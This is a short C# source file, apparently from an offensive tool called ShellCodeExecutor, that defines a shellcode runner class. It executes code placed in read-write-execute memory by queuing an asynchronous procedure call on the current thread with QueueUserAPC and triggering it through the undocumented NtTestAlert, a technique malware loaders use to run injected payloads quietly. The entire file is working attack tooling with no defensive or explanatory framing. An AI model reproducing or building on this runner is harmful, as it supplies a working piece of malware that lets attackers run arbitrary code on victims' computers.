using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShellCodeExecutor
{
   
    internal class QueueUserAPCShellCodeRunner : IShellCodeRunner
    {
        
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr NtTestAlert();
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();
        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        public void RunShellCode(IntPtr rwxMemory)

        {
            IntPtr pt = GetCurrentThread();
            IntPtr ptr = QueueUserAPC(rwxMemory, pt, IntPtr.Zero);
            NtTestAlert();
        }

        override
        public String ToString()
        {
            return "QueueUserAPC";
        }
    }
}
